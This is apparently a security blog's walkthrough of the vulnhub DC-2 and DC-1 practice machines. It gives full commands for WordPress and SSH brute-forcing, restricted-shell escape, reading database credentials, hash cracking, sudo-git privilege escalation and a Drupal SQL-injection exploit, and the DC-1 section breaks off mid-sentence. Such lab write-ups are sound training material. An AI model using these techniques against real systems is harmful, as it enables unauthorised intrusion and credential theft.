e.g. export URLfile=\u0026quot;http://192.168.56.111/FUZZ\u0026quot; Let\u0026rsquo;s make sure we\u0026rsquo;ve exported the variables correctly by running echo $IP; echo $URLdir; echo $URLfile echo our $IP, $URLdir, $URLfile vars PS If you ever export variables and then create a second shell, the second shell will only contain the previously exported variables if it\u0026rsquo;s a child shell of the first.\nScanning and Enumeration At this point, we\u0026rsquo;re set to start scanning and enumerating DC-2! Since this is a blog post, I\u0026rsquo;m going to keep things somewhat short but feel free to dig into anything/everything you can. If you find another path to go down, do it!\nThis part of the pentesting process can and should consume the largest amount of time, as you\u0026rsquo;re wanting to find everything about DC-2. Not only would this help if we were to get stuck but, if this were a pentest, we\u0026rsquo;d want to provide the customer an accurate report!\nnmap scan Anyways, let\u0026rsquo;s get to it by starting with a nmap scan against DC-2\u0026rsquo;s IP.\nnmap $IP -T4 -p- -sC -sV --open $IP \u0026ndash;\u0026gt; is the previously exported IP address of DC-2. -T4 \u0026ndash;\u0026gt; T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap\u0026rsquo;s Timing Templates webpage. -p- \u0026ndash;\u0026gt; tells nmap to scan ALL 65,535 TCP ports. -sC \u0026ndash;\u0026gt; specifies nmap to run default scripts. -A includes this. -sV \u0026ndash;\u0026gt; enables version detection. -A includes this. --open \u0026ndash;\u0026gt; only shows ports that are \u0026ldquo;open\u0026rdquo;. Safe against a purposely vulnerable box.\nnmap results - Linux box w/ http on 80, ssh on 7744 Analyzing nmap scan Debian Linux running services http(port 80) and ssh(port 7744). http(80) may only be accessible via hostname and not IP. Needs tested. Many reasons to this but maybe it\u0026rsquo;s hosting more than one webapp? ssh(7744) running on non-default port but that doesn\u0026rsquo;t change anything. Manual inspection of http(80) Let\u0026rsquo;s open a browser and visit the target IP(DC-2) and see what it shows.\nIt\u0026rsquo;s redirecting us to \u0026ldquo;http://dc-2/\u0026rdquo; domain? If you look at the nmap results, you\u0026rsquo;ll see nmap already reported this to us. \u0026ldquo;Did not follow redirect to http://dc-2/\u0026rdquo;\nI\u0026rsquo;d suspect that port 80 is configured with a name-based virtual host, meaning that one IP address could host multiple sites served by the hostname only.\nAdding dc-2 to /etc/hosts In order to tell our attack box that we want $IP to resolve to dc-2, we simply add this information to the /etc/hosts file on the attackbox.\nOnce we\u0026rsquo;re finished with the DC-2 box, we\u0026rsquo;ll simply revert this change.\nsudo nano /etc/hosts A few spaces below the existing content, let\u0026rsquo;s add *IP* dc-2.\nNOTE! Spacing between the IP address and hostname is (1) TAB! Not spaces via SPACEBAR. Now we do keyboard combos of CTRL+O then ENTER(to save it) followed by CTRL+X(to exit) Now confirm the changes by running cat /etc/hosts\nEnd result..\nadded dc-2 into /etc/hosts Rerun nmap after /etc/hosts update Look how our redirect is working and nmap is able to grab the proper banners!\nnmap results after /etc/hosts update - proper banners Reinspecting http(80) Let\u0026rsquo;s visit http://dc-2 in our browser.. Access to the webapp, finally! Looks like WordPress.\nWordpress CMS found Updating our notes Let\u0026rsquo;s notate what we\u0026rsquo;ve found and what possible tools/techniques to try. As we move forward, let\u0026rsquo;s continue to update our notes.\nBox Name : DC-2 (DC Series)\nOS : Debian (Linux)\nIP : 192.168.56.111\n80 : Apache httpd 2.4.10\nAdded \u0026ldquo;192.168.56.111 dc-2\u0026rdquo; to attackbox /etc/hosts to allow access of WP CMS\n80 : Wordpress 4.7.10\nWhat to try: view source, file/directory busting/fuzzing, wpscan\n7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)\nWhat to try: searchsploit for vulns\nWhen finished, remove IP dc-2 from /etc/hosts file\nFuzzing http/80 Now that we can access the webapp as intended, let\u0026rsquo;s move onto fuzzing!\nFuzzing is a technique used to inject something into an app and filter the responses. Since we\u0026rsquo;re dealing with a webapp, we\u0026rsquo;ll be using a tool called wfuzz to brute-force the webapp\u0026rsquo;s file and directory paths.\nwfuzz will simply brute-force the webapp\u0026rsquo;s file/directory parameter(or wherever we place the wordFUZZ), against a specified wordlist. For each word sent, it\u0026rsquo;ll record the webapp\u0026rsquo;s response. We then filter out the responses we don\u0026rsquo;t need, like 404\u0026rsquo;s, and a list is created! This can help us find hidden login pages, accidentally exposed files, etc. and save us time!\nThere\u0026rsquo;s various tools that can accomplish this task e.g. dirbuster, ffuf, wfuzz, etc but today I\u0026rsquo;ll stick with wfuzz. I\u0026rsquo;ll make sure to use different tools on DC-3, so we don\u0026rsquo;t become repetitive and boring.\nPromise! 😉\nI suggest you try any trusted tools and find your favorites.\nI\u0026rsquo;ll be updating the resources page here soon, which contains a large list of tools.\nFuzzing $URLfile Let\u0026rsquo;s start with fuzzing files by running the following command.\nwfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-files.txt --hc 403,404 $URLfile -c \u0026ndash;\u0026gt; provides a color output for the webapp\u0026rsquo;s response column. -z file,/*wordlist* \u0026ndash;\u0026gt; specifies payload type and points to file wordlist. --hc 403,404 \u0026ndash;\u0026gt; tells wfuzz not to display any 403 or 404 responses. $URLfile \u0026ndash;\u0026gt; is the exported variable with no appended backslash, meaning wfuzz will fuzz for files. Let\u0026rsquo;s manually visit each recorded response, in our browser, to see what it presents! ignore the last 404 PS If you lack the SecList wordlists, you can find it at Daniel Miessler\u0026rsquo;s Github Page. It\u0026rsquo;s a collection of various lists that can be used for various assessments! Very useful!\nwfuzz results - files files worth notating http://dc-2/xmlrpc.php \u0026ndash;\u0026gt; XML-RPC API? We can use this to brute-force logins without restrictions. wpscan can abuse this. We\u0026rsquo;ll use wpscan later! http://dc-2/wp-login.php \u0026ndash;\u0026gt; wp login page Potential login abuse techniques? http://dc-2/readme.html \u0026ndash;\u0026gt; info disclosure. versioning? PHP, MySQL, mod_rewrite apache module? Injections? Targeted exploits? http://dc-2/wp-links-opml.php \u0026ndash;\u0026gt; info disclosure. WP 4.7.10 confirmed Fuzzing $URLdir Let\u0026rsquo;s now fuzz against directories. We\u0026rsquo;ll simply change the exported variable and wordlist options in our previous command.\nwfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt --hc 403,404 $URLdir -z file,/*wordlist* \u0026ndash;\u0026gt; changed to a directories wordlist. $URLdir \u0026ndash;\u0026gt; exported variable that includes appended backslash, so wfuzz searches for directories. Let\u0026rsquo;s manually visit each recorded response, in our browser, to see what it presents! ignore the last three responses wfuzz results - directories directories worth notating http://dc-2/wp-includes/ \u0026ndash;\u0026gt; contains core WP file/folders http://dc-2/wp-includes/css/jquery-ui-dialog.min.css shows jQuery 1.11.4? Version may be wrong when compared to whatweb. http://dc-2/wp-admin/ \u0026ndash;\u0026gt; contains file/folders to the WP dashboard panel but redirects to /wp-login.php http://dc-2/wp-content/ \u0026ndash;\u0026gt; contains plugins/themes for WP Confirm webtech with Wappalyzer Regarding the potential webtech findings in the /readme.html file, let\u0026rsquo;s confirm those by visiting the site with a browser extension called Wappalyzer. Simply:\nInstall it through the browser\u0026rsquo;s extension manager\nVisit http://dc-2 with our browser and see which tech stack it\u0026rsquo;s using.\nWappalyzer Results We\u0026rsquo;re able to confirm:\nWordpress 4.7.10 \u0026ndash;\u0026gt; Confirmed with nmap after /etc/hosts update Apache HTTP Server 2.4.10 \u0026ndash;\u0026gt; Confirmed with nmap PHP \u0026ndash;\u0026gt; Found potential use through /readme.html. Version 5.2.4? Debian \u0026ndash;\u0026gt; Found through apache 404 error. Info Disclosure MySQL \u0026ndash;\u0026gt; Found in /readme.html. Version 5.0? jQuery 1.12.4 and jQuery Migrate 1.4.1. Versioning is off to our 1.11.4 finding. \u0026ndash;\u0026gt; Found in /wp-includes directory. Version 1.11.4? Twenty Seventeen Theme \u0026ndash;\u0026gt; Found with wpscan. Version 1.2? Findings \u0026amp; Updating Notes We have some additional info to add into our notes. Let\u0026rsquo;s also create a to-do section.\nPS If you attempt admin:password, at the /wp-login page, you\u0026rsquo;ll see that username enumeration is possible! If the XML-RPC API wasn\u0026rsquo;t enabled, we\u0026rsquo;d possibly attack this login page. Having username enumeration takes at least 50% out of the brute-forcing equation.\n/wp-login.php user enum possible TO-DO LIST\nThings to check:\nUse wpscan to: enumerate usernames brute-force WP login by abusing the XML-RPC API? Maybe create a custom wordlist? Hint from Flag 1 referencing a tool called cewl. Once we have shell, look for MySQL database as it may include sensitive information. NOTES\nBox Name : DC-2 (DC Series)\nOS : Debian (Linux)\nIP : 192.168.56.111\nUSERS :\nWP \u0026ndash;\u0026gt; admin ,\n80 : Apache httpd 2.4.10\nAdded \u0026ldquo;192.168.56.111 dc-2\u0026rdquo; to attackbox /etc/hosts to allow access of WP CMS\nmod_rewrite module exploits?\n80 : Wordpress 4.7.10\nUsername enumeration is possible at /wp-login.php\n/xmlrpc.php API enabled, so wpscan can be used to brute-force\n/wp-includes/ , /wp-admin/ , /wp-content/ directories found\n80 : PHP 5.2.4???\nInjection attacks?\n80 : MySQL 5.0???\nInjection attacks?\n80 : jQuery 1.12.4 \u0026amp; jQuery Migrate 1.4.1???\nXSS attacks?\n80 : Twenty Seventeen Theme 1.2???\nPotential exploits?\n7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)\nsearchsploit for vulns\nattempt logins via brute-force or once we enumerate potential usernames/passwords\nWhen finished, remove IP dc-2 from /etc/hosts file\nwpscan - Enumerating Usernames wpscan is a wordpress security scanner that allows us to assess wordpress apps.\nOur goal is to use wpscan to enumerate usernames, cewl to create a custom password list, and finally use wpscan to brute-force logins via the XML-RPC API that\u0026rsquo;s enabled, as it doesn\u0026rsquo;t limit login attempts.\nTo enumerate users with wpscan, simple run wpscan --url http://dc-2. Looks like we have three WP users, including the admin user we\u0026rsquo;ve already confirmed via /wp-login.php. Let\u0026rsquo;s add these users to our notes. admin; jerry; tom wpscan - user enumeration CeWL - Creating word lists CeWL, Custom Word List Generator, spiders the specified URL and creates a list per the flags specified.\nAfter a little googling(google is your friend!), it looks like wordpress uses a 10 character minimum requirement. So, we\u0026rsquo;ll be sure to use the flag -m with a argument of 10 to specify this minimal length requirement.\nIf you haven\u0026rsquo;t already, create a folder to store any related dc-2 files including the next cewl file we create.\nNow let\u0026rsquo;s run the cewl tool!\ncewl http://dc-2:80/ -m 10 -w $PWD/dc-2-cewl.txt\n-m 10 \u0026ndash;\u0026gt; specifies the minimum length of 10 characters -w $PWD/dc-2-cewl.txt \u0026ndash;\u0026gt; tells cewl to export file name \u0026ldquo;dc-2-cewl.txt\u0026rdquo; into the current working directory(var of $PWD) cat dc-2-cewl.txt and you\u0026rsquo;ll see these results. cewl results Let\u0026rsquo;s also create a list for usernames called dc-2-users.txt, so we can use it along side the password list dc-2-cewl.txt.\necho -e \u0026quot;admin\\njerry\\ntom\u0026quot; \u0026gt; dc-2-users.txt\n-e\u0026ndash;\u0026gt; echo recognizes \\n(new line), and others. \u0026gt; \u0026ndash;\u0026gt; overwrites data in the \u0026ldquo;dc-2-users.txt\u0026rdquo; file Now that we have some usernames and a custom password wordlist, let\u0026rsquo;s update our notes and then exploit the XML-RPC API 😃\nUpdating notes before exploiting TO-DO LIST\nThings to check:\nUse wpscan to: Brute-force WP XML-RPC with wpscan, dc-2-users.txt, and dc-2-cewl.txt After we get into wordpress, look for injection points, vulnerable plugins, etc Once we have shell, look for MySQL database as it may include sensitive information. NOTES\nBox Name : DC-2 (DC Series)\nOS : Debian (Linux)\nIP : 192.168.56.111\nUSERS : WP(admin;jerry;tom)\n80 : Apache httpd 2.4.10\nAdded \u0026ldquo;192.168.56.111 dc-2\u0026rdquo; to attackbox /etc/hosts to allow access of WP CMS\nmod_rewrite module exploits?\n80 : Wordpress 4.7.10\nUsername enumeration is possible at /wp-login.php\n/xmlrpc.php API enabled, so wpscan will be used to brute-force\n/wp-includes/ , /wp-admin/ , /wp-content/ directories found\n80 : PHP 5.2.4???\nInjection attacks?\n80 : MySQL 5.0???\nInjection attacks?\n80 : jQuery 1.12.4 \u0026amp; jQuery Migrate 1.4.1???\nXSS attacks?\n80 : Twenty Seventeen Theme 1.2???\nPotential exploits?\n7744 : OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0)\nsearchsploit for vulns\nattempt logins via brute-force or once we enumerate potential usernames/passwords\nWhen finished, remove IP dc-2 from /etc/hosts file\nExploiting Abusing WP XML-RPC XML-RPC is an API that allows another application to publish, edit, delete posts, upload new files, get a list of commands, edit comments all through a POST request. The reason this API is nice for attacks is there\u0026rsquo;s no limits or throttling to the request we send, plus it allows access to many different features.\nSince we\u0026rsquo;re going to be brute-forcing the login creds of a wordpress site, wpscan will first check and, if present, use this XML-RPC API as the attack vector. If it is absent, wpscan will shift to using the wp-login.php login fields.\nValidating WP Creds Let\u0026rsquo;s get to it and run the attack against XML-RPC\nwpscan --url http://dc-2/ --disable-tls-checks -U dc-2-users.txt -P dc-2-cewl.txt\n--url \u0026ndash;\u0026gt; specifies the URL to attack which is DC-2\u0026rsquo;s WP site --disable-tls-checks \u0026ndash;\u0026gt; disables TLS checks for HTTPs as we\u0026rsquo;re on HTTP -U \u0026ndash;\u0026gt; location of the username list to be used -P \u0026ndash;\u0026gt; location of the password list to be used wpscan - verified two valid combinations We have two valid credentials for WP;\njerry:adipiscing tom:parturient After logging into both accounts, it looks like they\u0026rsquo;re limited accounts. I was unable to upload *.php files through the media upload form. The plugins and themes pages are also absent, meaning we lack access to abusing them. So, without digging into this further, I think we\u0026rsquo;re meant to go about this by other means.\nSo, let\u0026rsquo;s try using the credentials, we validated against wordpress, against the SSH service on port 7744! Maybe we\u0026rsquo;ll get lucky and get ssh access into the debian server(dc-2).\nCredential reuse on SSH/7744 Let\u0026rsquo;s try logging in as jerry:\nssh jerry@dc-2 -p 7744 answer yes try adipiscing \u0026ndash;\u0026gt; Permission denied, please try again. try parturient \u0026ndash;\u0026gt; Permission denied, please try again. CTRL+C to cancel our attempts as jerry Try again but with username \u0026ldquo;tom\u0026rdquo;:\nssh tom@dc-2 -p 7744 try parturient We\u0026rsquo;re in!!!\ntom@dc-2 -p 7744 successful! Escaping Restricted Shell We\u0026rsquo;ve gained shell but it\u0026rsquo;s restricted.\nBy running ls $PATH, we\u0026rsquo;ll see that we are limited to four binaries:\nless, ls, scp, vi\nIf you run any other command, you\u0026rsquo;ll see the -rbash reference meaning \u0026ldquo;restricted bash\u0026rdquo;.\nrbash - restricted bash So first thing is first, we need to escape this restricted shell that user \u0026ldquo;tom\u0026rdquo; is restricted to.\nWe can use vi to escape the restricted shell.\nIn our SSH terminal:\nvi type :set shell=/bin/bash then enter type :shell then enter This will escape the restricted shell and we can confirm by running cd /.\nOnce we\u0026rsquo;ve gained shell, it\u0026rsquo;s nice to establish a proper and stable shell with tty. As we\u0026rsquo;re connected through SHH, we won\u0026rsquo;t need to spawn a shell through python but setting up PATH variables, etc will make our life easier.\nAnything struck-through represents that the command isn\u0026rsquo;t needed as we\u0026rsquo;re not in a reverse shell.\npython -c 'import pty; pty.spawn(\u0026quot;/bin/bash\u0026quot;)' \u0026ndash;\u0026gt; spawn an interactive shell via python export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp \u0026ndash;\u0026gt; setting additional PATH variables export TERM=xterm-256color \u0026ndash;\u0026gt; provides us some color in our output alias ll='ls -lsaht --color=auto' \u0026ndash;\u0026gt; sets an alias ll that runs ls -lsaht --color=auto Press Ctrl + Z to make it a background process stty raw -echo;fg;reset stty columns 200 rows 200 We should now have a unrestricted, fully interactive tty shell, with a ll command that runs ls -lsaht --color=auto BUT we\u0026rsquo;re still restricted in the form of system permissions. Hence, we\u0026rsquo;re moving onto privesc!\nPrivilege Escalation Enumerating user tom Let\u0026rsquo;s run through some simple enumeration of the current user, tom, and see if we can find anything to steal or exploit!\nsudo -l \u0026ndash;\u0026gt; requests for a password but nothing, we know, works. find / -perm -u=s -type f 2\u0026gt;/dev/null \u0026ndash;\u0026gt; as we lack sudo, none of the SUID or GUID binaries allow for privesc abuse. mysql access is denied for tom. Same issue with sudo. No working password. (It\u0026rsquo;s forcing us to follow a path\u0026hellip;) cat ~/.bash_history \u0026ndash;\u0026gt; nothing interesting in bash history.\nLet\u0026rsquo;s not forget that we may have access to the WP CMS webroot! Maybe we can steal sensitive information within the database?\ncd /var/www/html \u0026ndash;\u0026gt; Looks like we now have access to the WP files!\nAfter digging around in the html folder, I found that the wp-config.php contains MySQL creds!\nwpadmin:4uTiLL wpadmin:4uTiLL creds in wp-config.php Digging into MySQL database Now that we have potential MySQL creds, let\u0026rsquo;s go try them, and if successful, see if we can access more sensitive information!\nmysql -uwpadmin -p4uTiLL \u0026ndash;\u0026gt; we\u0026rsquo;re in! Let\u0026rsquo;s go searching! -u specifies the username, no space required. -p specifies the password, again no space required. Let\u0026rsquo;s search the database for sensitive information! show DATABASES \u0026ndash;\u0026gt; results in a wordpressdb database. Let\u0026rsquo;s select, aka use wordpressdb, by typing use wordpressdb; show TABLES \u0026ndash;\u0026gt; results in a wp_users table, let\u0026rsquo;s show the contents\u0026hellip; SELECT * FROM wp_users; \u0026ndash;\u0026gt; and there we have it! the hashes for admin, jerry, and tom. Let\u0026rsquo;s record those hashes into our notes and get cracking, cause why not! Simply hit CTRL+C to quit MySQL.\nhashes in wp_users MySQL table To root this box, we\u0026rsquo;re not needing to gather this SQL info nor do we need to crack hashes. We could skip this section and move onto Abusing jerry\u0026rsquo;s sudo privs with git but what\u0026rsquo;s the fun in that!\nHash algorithms w/ hash-identifier We have three hashes to crack.\nadmin:$P$BXC3GjdXdWYQbzZwQRv2hTo4XRtadY. tom:$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO. jerry:$P$BRCcbpudGlBukTwA7kJsb.rafAL4il. To crack them, we\u0026rsquo;ll be using a tool called hashcat, but first, we need to determine which hash algorithm was used. SHA1, MD5, etc?\nhash-identifier is the perfect tool for this.\nOpen up a new terminal and leave our current SSH connection alone, as we still need it!\nhash-identifier \u0026ndash;\u0026gt; this will execute and open the program\u0026rsquo;s CLI. We will simply copy/paste one of the hashes into the command-line and hit the \u0026rsquo;enter\u0026rsquo; key. hash-identifier responds with MD5(wordpress) Hit CTRL+C, to exit, and let\u0026rsquo;s now get into hashcat We now know we\u0026rsquo;re dealing with a MD5(WordPress) hash algorithm.\nCracking hashes with hashcat hashcat is a \u0026ldquo;password recovery\u0026rdquo; tool that utilizes your CPU and, if properly configured, your GPU to crack hashes. In this example, we\u0026rsquo;ll be using the CPU.\nTechnique becomes very important when cracking hashes, as it may differentiate between minutes vs days when cracking a hash\nWe know the hashes were made using the \u0026ldquo;Wordpress(MD5)\u0026rdquo; algorithm, so we need to make sure we tell hashcat this. Let\u0026rsquo;s start by looking up which argument we should provide to the flag -m.\nm is the flag that we use to specify which algorithm we\u0026rsquo;re attacking.\nThere\u0026rsquo;s many lists our there but here\u0026rsquo;s a quick reference. Generic Hash Types\nSimply CTRL+F for \u0026ldquo;WordPress\u0026rdquo; and you\u0026rsquo;ll land on a argument value of 400.\nNow we know which argument value to provide the flag -m. PS - Export the three found hashes, that were in the MySQL database, into a text file as we\u0026rsquo;ll need to specify that file in our hashcat command\nLet\u0026rsquo;s attack the hashes with our previously created cewl list called dc-2-cewl.txt.\nhashcat -m 400 -a 0 *location/hashes-to-crack.txt* dc-2-cewl.txt m \u0026ndash;\u0026gt; specifies the algorithm the hashes were created with. a 0 \u0026ndash;\u0026gt; tell hashcat to do a straight attack, meaning it\u0026rsquo;ll run straight through each word without altering it\u0026rsquo;s structure/order of characters. We\u0026rsquo;re able to crack the two previously found passwords but not the admin password\u0026hellip;\n$P$BxtBVzdeXeWoNQFW7unO11Qsp0lyTO.:parturient\n$P$BRCcbpudGlBukTwA7kJsb.rafAL4il.:adipiscing\ntwo hashes cracked, admin not cracked Since we have the hashes and know the algorithm, we could crack the admin password at a later time but I\u0026rsquo;ll pass. We\u0026rsquo;ve stolen the senstitive data from the MySQL database and ran through some cewl / hashcat examples. The concepts are what matter here. 😃\nAbusing jerry\u0026rsquo;s sudo privs with git Since it seems the box wants us to go for jerry now(tom \u0026amp; jerry cartoon\u0026hellip;), let\u0026rsquo;s login as jerry by:\nsu jerry \u0026ndash;\u0026gt; enter the WP password we found for jerry \u0026ndash;\u0026gt; adipiscing We\u0026rsquo;re in as jerry!\nsudo -l \u0026ndash;\u0026gt; looks like jerry has root privs to the binary git\njerry - sudo -l shows git as root! What do you know\u0026hellip; git can be abused(confirmed via GTFObins), if the user has sudo perms, to gain privesc!\nLet\u0026rsquo;s gain root!\nsudo git -p help config \u0026ndash;\u0026gt; enter\n!/bin/sh \u0026ndash;\u0026gt; enter\nROOTED! ROOTED! ","description":"","id":1,"section":"hacking","tags":["DC-2 (vulnhub)"],"title":"DC-2 of DC Series(vulnhub)","uri":"https://MRCyberBlog.github.io/blog/hacking/ctfs/vulnhub/dc-series/dc-2/"},{"content":"Let\u0026rsquo;s root DC-1!\nDetails can be found at https://www.five86.com/dc-1.html\nOpen this to see the box's overview pulled from the above website. DC-1 is a purposely built vulnerable lab for the purpose of gaining experience in the world of penetration testing. It was designed to be a challenge for beginners, but just how easy it is will depend on your skills and knowledge, and your ability to learn.\nTo successfully complete this challenge, you will require Linux skills, familiarity with the Linux command line and experience with basic penetration testing tools, such as the tools that can be found on Kali Linux, or Parrot Security OS.\nThere are multiple ways of gaining root, however, I have included some flags which contain clues for beginners.\nThere are five flags in total, but the ultimate goal is to find and read the flag in root\u0026rsquo;s home directory. You don\u0026rsquo;t even need to be root to do this, however, you will require root privileges.\nDepending on your skill level, you may be able to skip finding most of these flags and go straight for root.\nBeginners may encounter challenges that they have never come across previously, but a Google search should be all that is required to obtain the information required to complete this challenge.\nSince this box is locally hosted, we don\u0026rsquo;t need to get scope or approval, like we would if this were a live system(eg. Bug Bounty).\nWe will also skip OSINT and passive enumeration techniques as it\u0026rsquo;s not needed.\nThis doesn\u0026rsquo;t rule out all passive tools as this box could be hiding services, eg. through DNS.\nIf you\u0026rsquo;re ever needing to find the IP of a local box, sudo netdiscover -r *ip/cidr* will do the trick. -r specifies the range. If this tool doesn\u0026rsquo;t work, you could have routing issues. -i can specify the interface you need to run against. Another nifty tool is ip route get *ip* as this will tell you what route a packet will take to the ip specified. Anyways.. to the box!\nExport Environment Variables Exporting variables can help speed up some tasks. eg insert IP address into a command or when we fuzz directories and files of a webapp address.\nYour IP value will most likely differ, so adjust accordingly:\nexport IP=\u0026quot;192.168.56.110\u0026quot; export URLdir=\u0026quot;http://192.168.56.110/FUZZ/\u0026quot; \u0026lt;\u0026ndash; Directories export URLfile=\u0026quot;http://192.168.56.110/FUZZ\u0026quot; \u0026lt;\u0026ndash; Files appended backslash depicts directories vs files 😃 You can then test your exported vars by running echo $varname: eg. echo $IP would respond with 192.168.56.110. Scanning \u0026amp; Enumeration Before we move forward, let\u0026rsquo;s make a list that\u0026rsquo;ll include the important bits as we move forward. We\u0026rsquo;ll add/update as we go through the box, so we can reference it.\nBox Name: DC-1\nIP: 192.168.56.110\nnmap Let\u0026rsquo;s start with a simple nmap scan to see what we\u0026rsquo;re playing with:\nnmap $IP -T4 -p- -A --open\n$IP = target\u0026rsquo;s IP via exported variable. -T4 = T1(slowest) thru T5(fastest), T3 is the default speed. If you leave this option out, the scan will run at a default T3 speed. More can be learned at Nmap\u0026rsquo;s Timing Templates webpage. -p- = Tells nmap to scan all ports(TCP by default).. -A = Runs four options under one: OS detection Version detection Script scanning Traceroute --open = runs -A only against ports that are open. Idea is to speed up slow scans. Running a local box won\u0026rsquo;t cause much issues but when you\u0026rsquo;re running a slower scan or the latency is high, this option can help. DC-1 nmap scan Let\u0026rsquo;s start with port 80 as it\u0026rsquo;s most likely the weakest entry point due to the potential services listed in robots.txt. SSH, on port 22, isn\u0026rsquo;t much use as we currently lack keys, usernames, and passwords. We could brute force but it\u0026rsquo;ll take a while and it\u0026rsquo;s not guaranteed to work. rpc could be of use but I\u0026rsquo;m not seeing anything obvious in the list of services, so we\u0026rsquo;ll skip this for now. Box Name: DC-1\nIP: 192.168.56.110\nOS: Debian(Linux)\nPorts \u0026amp; Service:\n80 - Apache httpd 2.2.22- Drupal CMS v7.xx - \u0026lt;\u0026ndash; Focus here first\n111 - rpcbind\n43450 - rpcbind related\n22 - ssh - least attractive since we have no usernames, passwords, or keys\nManual Inspection of 80/webapp Open up a browser and enter the box\u0026rsquo;s IP address to visit the IP\u0026rsquo;s http service. Since it\u0026rsquo;s running on port 80, there\u0026rsquo;s no need to specify the port eg. 192.168.56.110 :80\nDC-1 http service Manually inspect the page source. Findings are:\nDrupal 7 = nmap already told us this\nNot much else going on\u0026hellip; Let\u0026rsquo;s see if we can enumerate the responses regarding the login fields at the /user/ directory\nNo response allows us to differentiate between username nor passwords.\nIf we could get a response saying \u0026ldquo;This email does not exist\u0026rdquo;, then that would allow us to brute force enumerate emails.\nSame goes for recovering an account.\nDefault credentials?\nSeems like that\u0026rsquo;s a negative. Drupal forces a password change when logging in for the first time. Answer found via google 😃 /robots.txt shows possible services running. Possibility for injections? PHP, SQL? Worth noting.\nsqlite mysql php POST responses show the Apache/2.2.22 (Debian) versioning nmap found\nPOST also shows PHP/5.4.45-0+deb7u14. nmap didn\u0026rsquo;t see this\nBox Name: DC-1\nIP: 192.168.56.110\nOS: Debian(Linux)\nPorts \u0026amp; Service:\n80 - Apache httpd 2.2.22 - Drupal CMS v7.xx - php 5.4.45-0+deb7u14 - sql ?\n111 - rpcbind\n43450 - rpcbind related\n22 - ssh - least attractive since we have no usernames, passwords, or keys\nFuzzing webapp/80 I tried fuzzing but it didn\u0026rsquo;t result in anything interesting beyond what robots.txt already told us. Example commands would be\u0026hellip; wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLfile wfuzz -c -z file,/usr/share/wordlists/SecLists/Discovery/Web-Content/CMS/Drupal.txt --hc 404 $URLdir I also tried dirbuster with similar results. Some results I got were: 000000007: 200 54 L 164 W 3151 Ch \u0026ldquo;install.php\u0026rdquo; 000000005: 200 0 L 6 W 42 Ch \u0026ldquo;xmlrpc.php\u0026rdquo; 000000237: 200 9 L 15 W 283 Ch \u0026ldquo;rss.xml\u0026rdquo; Researching Vulnerabilities I was hoping to find something more than just a general version 7 of Drupal\u0026hellip; eg 7.26, but that\u0026rsquo;s okay. Let\u0026rsquo;s go ahead and run searchsploit against Drupal and see what we get back.\nsearchsploit Drupal\nDC-1 Drupal 7 searchsploit Well, good news is there isn\u0026rsquo;t many version 7 exploits!\nWe\u0026rsquo;re looking for RCE(remote code execution) as it will provide us the quickest/easiest way into the system. We also want something that doesn\u0026rsquo;t require authentication, although we can make a user at /user/register. There\u0026rsquo;s always the chance a non-privileged user would have enough privs to execute such an exploit.\nThe Drupalgeddon2 sticks out to me but I want a more manual approach and something that\u0026rsquo;ll be sure to work with version 7.xx \u0026hellip; Let\u0026rsquo;s go with the php/webapps/34992.py. We could use msfconsole and let that automate most of what we\u0026rsquo;ll do below, but what\u0026rsquo;s the fun in that!\nMy thought process is that we\u0026rsquo;ll create an admin account in drupal and see what drupal has to offer. We saw PHP and SQL in robots.txt, so we\u0026rsquo;ll most likely have a way in through those. Speaking of SQL, 34992.py script will be using SQLi, so that\u0026rsquo;s a start\u0026hellip;\nDownload the script to a local directory and cat the contents\u0026hellip; searchsploit -m php/webapps/34992.py \u0026lt;\u0026ndash; This will download the script to the current directory using searchsploit. Love this feature. cat 34992.py \u0026lt;\u0026ndash; This will output the contents of the .py script, so we can dig into it and alter code if needed. Many scripts don\u0026rsquo;t hold your hand, so knowing how to read code is very helpful. You\u0026rsquo;ll see this line which tells us the command options needed, so we can successfully execute the script against the target.\nDC-1 Drupal 7 exploit (\u0026lsquo;usage: %prog -t http[s]://TARGET_URL -u USER -p PASS\\n\u0026rsquo;)\nSo we\u0026rsquo;ll try\u0026hellip; python2 34992.py -t http://$IP -u owned -p owned\nThis will hopefully create an admin account we can login to via the homepage of Drupal. From there the goal is to look for a way to upload a malicious php file. eg a reverse shell or possibly a plugin to exploit. Who knows. I\u0026rsquo;m just guessing but since this is a CMS(Drupal) and most likely running PHP, I bet our chances are good. Exploitation Well\u0026hellip; let\u0026rsquo;s get to it.\npython2 34992.py -t http://$IP -u owned -p owned IF YOU GET A \u0026ldquo;SyntaxError: Missing parentheses in call to \u0026lsquo;print\u0026rsquo;. Did you mean print(\u0026hellip;)?\u0026rdquo;\u0026hellip;\nyou\u0026rsquo;re not running the script under python2\u0026hellip; which is required.\nDC-1 Drupal 7 admin created Now let\u0026rsquo;s test the login page\u0026hellip; with owned:owned.\nADMIN LOGGED IN\nDC-1 Drupal 7 admin logged in Now that we\u0026rsquo;re in a CMS, we should look around and enumerate what we can\u0026hellip;\nEnumerating Drupal admin pages It\u0026rsquo;s important to gather as much information as you can as it might come into handy later on\u0026hellip; so let\u0026rsquo;s see what we can find inside Drupal as admin.\nUsername Fred found Username admin found So brute forcing may have been an option but maybe it has lockout? flag3 is found under content\u0026hellip; Special PERMS will help FIND the passwd - but you\u0026rsquo;ll need to -exec that command to work out how to get what\u0026rsquo;s in the shadow. This seems to hint to maybe the find command allowing us access to certain files we shouldn\u0026rsquo;t have access to? Sticky bit? Worth checking once we\u0026rsquo;re in\u0026hellip; Let\u0026rsquo;s look in the module tab and see if there\u0026rsquo;s anything php related\u0026hellip; I found and enabled the follow module\u0026hellip; \u0026ldquo;PHP filter\u0026rdquo;. It may just allow us to upload malicious PHP code.\nDC-1 Drupal 7 Enabled PHP Filter Not that it\u0026rsquo;s enabled, we should see if we can give it administrator rights.. Click the \u0026ldquo;Permissions\u0026rdquo; and then check the \u0026ldquo;administrator\u0026rdquo; user box for \u0026ldquo;Use the 